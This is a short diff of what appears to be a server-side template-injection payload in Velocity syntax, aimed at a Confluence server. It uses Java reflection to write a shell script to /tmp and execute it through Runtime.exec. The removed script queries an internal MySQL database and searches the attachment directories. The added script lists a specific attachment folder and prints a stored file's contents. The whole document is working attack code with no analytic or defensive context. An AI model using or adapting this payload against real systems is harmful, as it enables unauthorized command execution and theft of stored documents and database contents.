@@ -1,6 +1,6 @@
 #set($x = "")
 #set($w2 = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$w2.write("echo ===COLS===; mysql -h10.18.19.53 -D confluence -N --batch -e 'show columns from attachments_backup' 2>&1 | cut -f1 | tr '\n' ' '; echo; echo ===LEAFDIR===; timeout 80 find /u01/confluence-home/attachments/ver003 -type d -name '14713529' 2>/dev/null | head -3; echo ===LEAFDIR2===; timeout 60 find /u01/confluence-home/attachments/ver003 -type d -name '15269953' 2>/dev/null | head -3")
+$w2.write("P=/u01/confluence-home/attachments/ver003/93/89/16089093/238/105/14355738/14713529; echo ===LS===; ls -la /u01/confluence-home/attachments/ver003/93/89/16089093/238/105/14355738/14713529/ 2>&1; echo ===CONTENT===; cat /u01/confluence-home/attachments/ver003/93/89/16089093/238/105/14355738/14713529/1 2>&1 | head -c 3000")
 $w2.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
